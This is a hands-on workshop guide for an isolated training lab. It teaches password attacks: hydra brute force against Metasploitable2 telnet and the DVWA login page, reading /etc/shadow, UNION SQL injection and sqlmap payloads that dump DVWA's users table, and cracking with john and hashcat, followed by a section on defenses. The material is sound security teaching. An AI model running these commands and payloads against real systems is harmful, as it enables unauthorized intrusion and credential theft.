# Warning
This workshop is for educational purposes only.
Ethical hacking is conducted with the explicit permission of the system owner to improve security.
Never run password attacks against systems you do not own or do not have written authorization to test. Everything in this workshop happens inside the WOCSA CyberRange, an intentionally vulnerable, isolated lab.

# Table of Contents

- [Warning](#warning)
- [Table of Contents](#table-of-contents)
- [Introduction](#introduction)
  - [Why password cracking matters](#why-password-cracking-matters)
  - [How hashes work](#how-hashes-work)
  - [Offline vs online attacks](#offline-vs-online-attacks)
  - [Ethics](#ethics)
- [Prerequisites](#prerequisites)
- [Part 1 — Online vs offline attacks](#part-1--online-vs-offline-attacks)
  - [Online brute force with Hydra](#online-brute-force-with-hydra)
    - [Metasploitable2 telnet](#metasploitable2-telnet)
    - [DVWA brute force page](#dvwa-brute-force-page)
  - [Why online attacks are noisy](#why-online-attacks-are-noisy)
- [Part 2 — Hash extraction (lab techniques)](#part-2--hash-extraction-lab-techniques)
  - [From Metasploitable2: /etc/shadow](#from-metasploitable2-etcshadow)
  - [From DVWA via SQLi: dump the users table](#from-dvwa-via-sqli-dump-the-users-table)
    - [Manual UNION injection](#manual-union-injection)
    - [sqlmap one-liner](#sqlmap-one-liner)
  - [Other places hashes hide](#other-places-hashes-hide)
- [Part 3 — Cracking with John the Ripper](#part-3--cracking-with-john-the-ripper)
  - [Cracking md5crypt hashes from /etc/shadow](#cracking-md5crypt-hashes-from-etcshadow)
  - [Cracking raw MD5 hashes from DVWA](#cracking-raw-md5-hashes-from-dvwa)
  - [What to expect (be honest)](#what-to-expect-be-honest)
- [Part 4 — Cracking with hashcat](#part-4--cracking-with-hashcat)
  - [hashcat basics](#hashcat-basics)
  - [md5crypt with hashcat (-m 500)](#md5crypt-with-hashcat--m-500)
  - [Raw MD5 with hashcat (-m 0)](#raw-md5-with-hashcat--m-0)
  - [Stretch goals: rules and benchmarks](#stretch-goals-rules-and-benchmarks)
- [Part 5 — Hash identification](#part-5--hash-identification)
- [Defense](#defense)
- [Lab exercises](#lab-exercises)
- [Takeaways checklist](#takeaways-checklist)
- [Resources](#resources)

# Introduction

## Why password cracking matters

Passwords remain the most common authentication factor in the enterprise world, and they are usually the weakest link. When an attacker compromises a system — through SQL injection, a vulnerable service, phishing, or a misconfigured backup — one of the first things they hunt for is a file of password hashes. Cracking those hashes offline lets them:

- Reuse the same password on other systems (password reuse is extremely common).
- Escalate privileges on the current host.
- Pivot deeper into the network (the CyberRange is literally built around this: DVWA is the only pivot into the intranet).

As a defender, you run the same tools to audit your own systems: if a tool like `john` or `hashcat` recovers your users' passwords in seconds, an attacker will too.

## How hashes work

A hash is a one-way function: `plaintext -> hash` is fast, `hash -> plaintext` is computationally infeasible *by design*. A good hash function has these properties:

- **Deterministic**: the same input always gives the same output.
- **One-way**: you cannot invert the function.
- **Avalanche effect**: changing one character of the input completely changes the output.
- **Collision resistance**: two different inputs should not produce the same hash.

Password cracking does **not** invert the hash. It *guesses*: take a wordlist, hash each candidate with the exact same algorithm, and compare the result to the stolen hash. A match means the guess is the password. That is why weak passwords fall in seconds while long random passwords survive.

**Salts**: a salt is a random value stored with the hash and mixed into the computation (in `$1$salt$hash`, the salt is the middle field). Salts defeat precomputed tables (rainbow tables): two users with the same password get different hashes, so each guess must be computed per-hash.

Common formats you will meet in this workshop:

| Format | Example (skeleton) | Notes |
|---|---|---|
| Raw MD5 | `5f4dcc3b5aa765d61d8327deb882cf99` | Unsalted, ancient, trivial to crack. |
| md5crypt | `$1$salt$hash` | Salted MD5 with 1000 rounds; classic Linux `/etc/shadow` format. |
| sha256crypt | `$5$salt$hash` | Modern Linux `/etc/shadow` default. |
| bcrypt | `$2b$12$...` | Cost factor, slow by design. |
| Argon2 | `$argon2id$...` | Current state of the art, tunable memory cost. |

## Offline vs online attacks

- **Online attack**: you send guesses to a live service (telnet, SSH, a web login form) and watch the response. Detected by logs, lockouts, rate limiting, and network monitoring. Slow (network round-trip per guess). In this lab: Hydra.
- **Offline attack**: you possess the hash file and crack it on your own machine at millions/billions of guesses per second. No lockouts, no logs, nobody sees you. In this lab: John the Ripper and hashcat.

In a real assessment, the flow is: get a foothold (online), steal hashes, crack them offline, then use the recovered passwords online to move laterally.

## Ethics

Password attacks are illegal without permission. Inside the CyberRange you are the owner. Outside, the only acceptable targets are your own accounts or systems you have a signed authorization to test (a penetration test contract, a bug bounty scope). Cracking hashes you obtained illegally is still illegal.

# Prerequisites

1. **CyberRange up**:
   ```bash
   cd CyberRange
   docker compose up -d
   ```
   DVWA is available at `http://localhost:8081` (DMZ). Default DVWA login: `admin` / `password`.

2. **VPN access to the intranet**: Metasploitable2 (`10.5.20.12`) is reachable **only through the WireGuard VPN**. Create a peer in the wg-easy admin UI (`http://localhost:51821`, credentials in `CyberRange/.env`), import the `.conf` in your WireGuard client, and verify:
   ```bash
   ping 10.5.20.12
   ```

3. **Attacker box**: the CyberRange's AI/offensive container is a Kali with everything preinstalled (`john`, `hashcat`, `hydra`, `nmap`, `sqlmap`, `/usr/share/wordlists/rockyou.txt.gz`):
   ```bash
   docker exec -it kali-cai bash
   ```
   Alternatively, any Kali/Parrot machine with the same tools works. If `rockyou.txt.gz` is still compressed, unzip it first:
   ```bash
   zcat /usr/share/wordlists/rockyou.txt.gz > /tmp/rockyou.txt
   ```

# Part 1 — Online vs offline attacks

Online brute-forcing guesses credentials against a live service. In the CyberRange we practice it with Hydra on two targets where it actually works.

## Online brute force with Hydra

### Metasploitable2 telnet

Metasploitable2 runs telnet on port 23 (and SSH on 22) and its default credentials are famously `msfadmin` / `msfadmin`. Hydra against the telnet service:

```bash
# first, make sure the target is reachable (VPN up)
nmap -p23 10.5.20.12

# hydra against telnet with a small wordlist
hydra -l msfadmin -P /tmp/rockyou.txt telnet://10.5.20.12
```

With the full rockyou list this can take a while — telnet is one connection per guess. For a fast demonstration, build a tiny wordlist and run the same attack:

```bash
echo -e "msfadmin\nadmin\npassword\nroot\ntoor\nwocsa" > /tmp/words.txt
hydra -l msfadmin -P /tmp/words.txt telnet://10.5.20.12
```

Expected output: hydra finds the valid pair almost immediately (as soon as `msfadmin` is tried) and prints `[23][telnet] host: 10.5.20.12  login: msfadmin  password: msfadmin`.

The same idea works on SSH:

```bash
hydra -l msfadmin -P /tmp/words.txt ssh://10.5.20.12
```

### DVWA brute force page

DVWA has a dedicated *Brute Force* page: `http://localhost:8081/vulnerabilities/brute/`. At **LOW** security, the page has no CSRF token, so we can brute-force it directly with hydra — we just need a valid session cookie:

1. Log in to DVWA at `http://localhost:8081` (`admin` / `password`) and set the security level to **low** on `/security.php`.
2. Grab your `PHPSESSID` cookie from the browser dev tools (or with curl).
3. Run hydra with the cookie in the `H` header, using the form parameters the page sends (`username`, `password`, `Login`):

```bash
hydra -l admin -P /tmp/words.txt "http-get-form://localhost:8081/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie: PHPSESSID=<sid>; security=low:F=incorrect"
```

- `F=incorrect` is the failure string the page returns on a bad login (hydra treats a response containing it as a failed attempt) — it must be the **last** option in the target string (verified against the range).
- The brute page also accepts GET parameters, so hydra's `http-get` module works too: `http-get://localhost:8081/vulnerabilities/brute/?username=^USER^&password=^PASS^&Login=Login:H=Cookie: ...:F=incorrect`.
- If a future DVWA version adds a CSRF token to this page, hydra's `^TOKEN^` mechanism cannot parse it — re-grab the page manually and note that online form attacks die the moment tokens, captchas, or rate limits appear.
- **Note**: brute-forcing the main DVWA login is deliberately painful because that form *does* carry a CSRF token. This is exactly the "lockout/CSRF" lesson — use the brute page at low security instead.

## Why online attacks are noisy

- **Rate limits / lockouts**: after N failures the account locks or slows down. The whole point of the brute page at low security is that nothing of the sort exists.
- **Logs**: every attempt lands in the service logs (telnet logs, web server access logs, Grafana dashboards in this range). A real SOC would see the flood immediately.
- **Network noise**: thousands of connections stand out like a lighthouse.
- That is why real attackers prefer to *steal hashes and crack offline* — which is what Parts 2–4 are about.

# Part 2 — Hash extraction (lab techniques)

Hashes are where the fun starts. In the lab we extract them from two places: Metasploitable2's `/etc/shadow` and DVWA's database.

## From Metasploitable2: /etc/shadow

Log in to Metasploitable2 over telnet or SSH (it is on the intranet, VPN required):

```bash
telnet 10.5.20.12     # login: msfadmin / password: msfadmin
# or
ssh msfadmin@10.5.20.12
```

Once inside, read the password file. `/etc/passwd` holds user accounts (world-readable); `/etc/shadow` holds the actual password hashes (root-readable):

```bash
cat /etc/passwd | grep -E "root|msfadmin"
cat /etc/shadow
```

The two hashes you will see (verified on the live CyberRange image):

```
root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::
msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:14684:0:99999:7:::
```

Format breakdown of a shadow entry: `username:$1$salt$hash:last_change:min:max:warn:inactive:expire`. The `$1$` prefix means **md5crypt** — salted MD5 with 1000 rounds (hashcat mode `-m 500`, john format `md5crypt`).

Save the two full lines into a file for the cracking tools:

```bash
cat > /tmp/shadow.txt <<'EOF'
root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::
msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:14684:0:99999:7:::
EOF
```

## From DVWA via SQLi: dump the users table

DVWA stores its users in the `dvwa` database, table `users`, with **raw MD5** password hashes (unsalted — 2008-era code). The DVWA container itself has **no mysql client**, and the `dvwa-db` container lives on the segregated db-tier (`10.5.15.10`, creds `dvwa` / `p@ssw0rd` from the DVWA config) reachable *only from the DVWA container*. The practical way in is the **SQL injection page** at LOW security: `http://localhost:8081/vulnerabilities/sqli/?id=1&Submit=Submit`.

Sanity checks (verified live):
- `id=1` → returns the user "admin".
- `id=%27` (a single quote) → SQL syntax error, proving the parameter is injectable.

### Manual UNION injection

Goal: `SELECT user,password FROM dvwa.users`. The original query is something like `SELECT first_name, last_name FROM users WHERE user_id = '$id'` — it returns **2 columns** at low security, which is what we exploit with a UNION:

1. Confirm the column count with `ORDER BY`:
   ```
   http://localhost:8081/vulnerabilities/sqli/?id=1' ORDER BY 2--+&Submit=Submit   # works (no error)
   http://localhost:8081/vulnerabilities/sqli/?id=1' ORDER BY 3--+&Submit=Submit   # error => 2 columns
   ```
2. Dump usernames and hashes (URL-encode the quote as `%27` and spaces as `+` or `%20`):
   ```
   http://localhost:8081/vulnerabilities/sqli/?id=%27 UNION SELECT user,password FROM users--+&Submit=Submit
   ```
   Result: the page renders the extra row. The `users` table contains `admin`, `gordonb`, `1337`, `pablo` and `smithy` — `admin` and `smithy` both have `5f4dcc3b5aa765d61d8327deb882cf99`, which is literally the MD5 of `password` (we will crack it instantly in Part 3).

3. If a query errors out, adjust: some pages need `NULL` placeholders for the non-string columns (`UNION SELECT 1,password FROM users`), or a different number of columns — probe with `UNION SELECT 1,2,3,...` until the numbers render on the page.

Save what you dump:

```bash
cat > /tmp/dvwa_hashes.txt <<'EOF'
admin:5f4dcc3b5aa765d61d8327deb882cf99
smithy:5f4dcc3b5aa765d61d8327deb882cf99
EOF
```

### sqlmap one-liner

`sqlmap` is installed in `kali-cai`. Give it the vulnerable URL plus your session cookie (log in first, set security to **low**):

```bash
sqlmap -u "http://localhost:8081/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=<sid>; security=low" --dump -T users
```

sqlmap confirms the injection, dumps the `users` table, and prints the MD5 hashes. (`--batch` answers all prompts automatically if you want to script it.)

## Other places hashes hide

Conceptually, hashes live anywhere an application stores credentials: WordPress-style CMS databases (`wp_users.user_pass` — salted phpass), configuration files, backups, LDAP dumps, or memory. In the CyberRange, the workstations (`10.5.20.21` / `10.5.20.22`) and the file server (`10.5.20.11`, sftpgo) are more places to hunt for loose credentials — a good follow-up exercise once you master the tools here.

# Part 3 — Cracking with John the Ripper

John's workflow: it auto-detects the format from the `$id$` prefix when you give it a raw shadow line. It is single-CPU by default.

## Cracking md5crypt hashes from /etc/shadow

```bash
john --format=md5crypt /tmp/shadow.txt
# or, if you have a combined passwd+shadow, unshadow first (see below)
john --format=md5crypt --wordlist=/tmp/rockyou.txt /tmp/shadow.txt
```

**`unshadow`**: when you only have `/etc/passwd` and `/etc/shadow` from a box, combine them into john's native format first:

```bash
unshadow /tmp/passwd.txt /tmp/shadow.txt > /tmp/unshadowed.txt
john --format=md5crypt /tmp/unshadowed.txt
```

## Cracking raw MD5 hashes from DVWA

Raw MD5 needs the `raw-md5` format:

```bash
john --format=raw-md5 --wordlist=/tmp/rockyou.txt /tmp/dvwa_hashes.txt
```

Check results any time:

```bash
john --show /tmp/dvwa_hashes.txt
john --show --format=md5crypt /tmp/shadow.txt
```

## What to expect (be honest)

- **DVWA hashes crack almost instantly.** `5f4dcc3b5aa765d61d8327deb882cf99` is in every wordlist on earth because it *is* `password`. `john --show` prints the recovered plaintexts. This is your guaranteed "it works" moment.
- **The Metasploitable2 md5crypt hashes will very likely NOT crack with rockyou.** Be explicit about this: the classic metasploitable2 hashes are notoriously hard to crack because the plaintexts are *not* common passwords and are not in rockyou (they are quirks of the default VM image, not "msfadmin"). Even a hand-made list like `msfadmin/admin/password/root/toor/wocsa` will not crack them. Do not panic — that is a *feature* of this lab: treat john/hashcat **mechanics** as the goal on the shadow file, and use the DVWA hashes for the guaranteed crack. In a real engagement you would also throw rules, masks, and hybrid attacks at a stubborn hash (Part 4 stretch goals) — and sometimes the answer is simply "the password is strong".

# Part 4 — Cracking with hashcat

hashcat uses the GPU if available; on CPU-only hosts (like `kali-cai`) it uses OpenCL with the CPU device. Modes used in this workshop:

| Mode | Format | Example target |
|---|---|---|
| `-m 500` | md5crypt (`$1$`) | Metasploitable2 `/etc/shadow` |
| `-m 0` | Raw MD5 | DVWA `users` table |

## hashcat basics

```bash
hashcat --help | grep -A5 "Hash modes"
hashcat -b -m 0        # quick benchmark: how fast is this host at raw MD5?
```

**CPU device selection**: if hashcat complains about no suitable device or sits idle, force the CPU OpenCL device (`-D 2`) and the CPU-optimized backend:

```bash
hashcat -D 2 --backend-ignore-cuda -m 0 /tmp/dvwa_hashes.txt /tmp/rockyou.txt
```

## md5crypt with hashcat (-m 500)

```bash
# strip the shadow lines down to just the $1$...$... hash part, one per line:
cat > /tmp/md5crypt_hashes.txt <<'EOF'
$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.
$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/
EOF

hashcat -m 500 -a 0 /tmp/md5crypt_hashes.txt /tmp/rockyou.txt
```

md5crypt is ~1000 rounds of MD5 — much slower than raw MD5 but still fast by modern standards. Expect the same honest result as john: rockyou very likely fails on these two image-default hashes.

## Raw MD5 with hashcat (-m 0)

```bash
hashcat -m 0 -a 0 /tmp/dvwa_hashes.txt /tmp/rockyou.txt
```

`hashcat --show -m 0 /tmp/dvwa_hashes.txt` prints the cracked pairs — `5f4dcc3b5aa765d61d8327deb882cf99:password` appears almost instantly.

## Stretch goals: rules and benchmarks

- **Rules** mutate each wordlist entry (append `123`, l33t-speak, capitalization). The classic bundled ruleset:
  ```bash
  hashcat -m 0 -a 0 -r /usr/share/hashcat/rules/best64.rule /tmp/dvwa_hashes.txt /tmp/rockyou.txt
  ```
- **Masks** (`-a 3`) brute-force by pattern instead of wordlist, e.g. `?l?l?l?l?d?d` for 4 lowercase letters + 2 digits. Try it on a hash you created yourself:
  ```bash
  echo -n "pass123" | md5sum   # 6 letters? craft your own target hash
  hashcat -m 0 -a 3 <hashfile> "?l?l?l?l?d?d?d"
  ```
- **Benchmarks** put numbers on the defense discussion: run `hashcat -b -m 0` vs `hashcat -b -m 3200` (bcrypt) and watch the speed drop by orders of magnitude — that drop is exactly why bcrypt/argon2 are the right choices.

# Part 5 — Hash identification

Before cracking, identify the format. The quick way:

```bash
hashid '$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.'
hashid '5f4dcc3b5aa765d61d8327deb882cf99'
```

hashid reports md5crypt for the `$1$` hash and MD5 for the DVWA one. Cross-check with hashcat's built-in example table:

```bash
hashcat --example-hashes | grep -B1 -A3 "MD5"
```

Cheat sheet for the formats used in this workshop:

| Prefix / shape | Format | john format | hashcat mode | Example |
|---|---|---|---|---|
| 32 hex chars | Raw MD5 | `raw-md5` | `-m 0` | `5f4dcc3b5aa765d61d8327deb882cf99` |
| `$1$salt$hash` | md5crypt | `md5crypt` | `-m 500` | `$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/` |
| `$5$salt$hash` | sha256crypt | `sha256crypt` | `-m 1800` | `$5$rounds=5000$...` |
| `$2b$cost$...` | bcrypt | `bcrypt` | `-m 3200` | `$2b$12$LQv3c1yqBWVHxkd0LHAkCOYz6TtxMQJqhN8/LewdBPj2J4kZ6LqF.` |
| `$argon2id$...` | Argon2id | `argon2` | `-m 21700` | `$argon2id$v=19$m=65536,t=3,p=4$...` |

# Defense

If cracking is this easy, the defense follows directly:

- **Hash properly**: bcrypt or Argon2id with a work factor that makes guesses expensive (check hashcat benchmark numbers — that is your budget). Never store raw MD5 or unsalted SHA variants.
- **Salt everything**: unique salt per user kills rainbow tables and precomputed attacks.
- **MFA**: a cracked password alone should not be enough — add a second factor everywhere it matters (VPN, admin UIs).
- **Password policy vs usability**: long, unique passphrases beat short complexity rules; password managers enable them. Periodic forced rotation mostly hurts.
- **Detect offline dumps**: file integrity monitoring on `/etc/shadow`-equivalent stores, audit logs, and alerts when a database is unexpectedly read by a web app (a UNION dump looks like an anomaly in the query logs).
- **Fight credential stuffing**: since cracked passwords get reused, monitor for login anomalies, breached-password checks at registration, and per-service unique credentials.
- **In this range**: the default `admin`/`password` DVWA credentials, `msfadmin`/`msfadmin` on Metasploitable2, and Grafana's `admin`/`admin` are exactly the "found in one second" failures you just exploited. That is the whole lesson.

# Lab exercises

1. **Online brute force — telnet**: from `kali-cai`, run hydra against `10.5.20.12` telnet with a wordlist that contains `msfadmin`. *Expected: hydra reports `msfadmin:msfadmin` in seconds.*
2. **Online brute force — DVWA brute page**: log in to DVWA, set security to low, grab your `PHPSESSID`, and run the hydra `http-get-form` command with a small wordlist. *Expected: hydra finds the valid `admin` password and prints the success (no "Username and/or password incorrect." response).*
3. **Extract shadow hashes**: telnet into Metasploitable2, `cat /etc/shadow`, and copy the two `$1$` lines into `/tmp/shadow.txt`. *Expected: you recognize md5crypt format (`$1$` = hashcat `-m 500`).*
4. **Extract DVWA hashes via SQLi**: use the manual UNION technique (2 columns at low security) to dump `user,password` from `dvwa.users`; then repeat with the sqlmap one-liner. *Expected: you recover `5f4dcc3b5aa765d61d8327deb882cf99` for the `admin` (and `smithy`) accounts.*
5. **Crack with john**: run `john --format=raw-md5` on the DVWA hashes, then `john --format=md5crypt` on the shadow file, then inspect both with `john --show`. *Expected: DVWA hash cracks to `password` almost instantly; the Metasploitable2 hashes very likely stay uncracked with rockyou — explain why.*
6. **Crack with hashcat**: run `hashcat -m 0` on the DVWA hashes and `hashcat -m 500` on the md5crypt hashes (CPU device `-D 2` if needed), then `hashcat --show`. *Expected: same results as john; note the cracking speed difference between mode 0 and mode 500.*
7. **Identify hashes**: run `hashid` on both hash types and cross-check with `hashcat --example-hashes`. *Expected: correct format identification in under a minute.*
8. **Stretch — rules**: run hashcat with `-r best64.rule` on the DVWA hashes against a tiny wordlist of your own making. *Expected: you understand how rules multiply a wordlist.*
9. **Stretch — defense math**: run `hashcat -b -m 0` and compare with a bcrypt benchmark (`-m 3200`). *Expected: raw MD5 is billions of guesses/sec, bcrypt orders of magnitude slower — the argument for modern hashing.*

# Takeaways checklist

- [ ] I can explain the difference between online and offline password attacks.
- [ ] I ran hydra against a live service (telnet) and a web form (DVWA brute page) and understand why online attacks are noisy and lockable.
- [ ] I extracted hashes from `/etc/shadow` and from a database via SQL injection.
- [ ] I identified md5crypt (`$1$`) and raw MD5 hashes with `hashid`.
- [ ] I cracked the DVWA hash (`password`) with john and hashcat.
- [ ] I understand why the Metasploitable2 image-default hashes resist rockyou, and that "no crack" is a legitimate result.
- [ ] I can read `john --show` and `hashcat --show` output.
- [ ] I can explain why bcrypt/argon2, salts, and MFA are the real defenses.

# Resources

- hashcat wiki: https://hashcat.net/wiki/
- hashcat example hashes: https://hashcat.net/wiki/doku.php?id=example_hashes
- John the Ripper docs: https://www.openwall.com/john/
- Hydra docs: https://github.com/vanhauser-thc/thc-hydra
- sqlmap: https://sqlmap.org/
- rockyou origin (2009 RockYou breach): https://en.wikipedia.org/wiki/RockYou
- DVWA: https://github.com/digininja/DVWA
- Metasploitable2: https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide/
- WOCSA CyberRange: ../../CyberRange/README.md
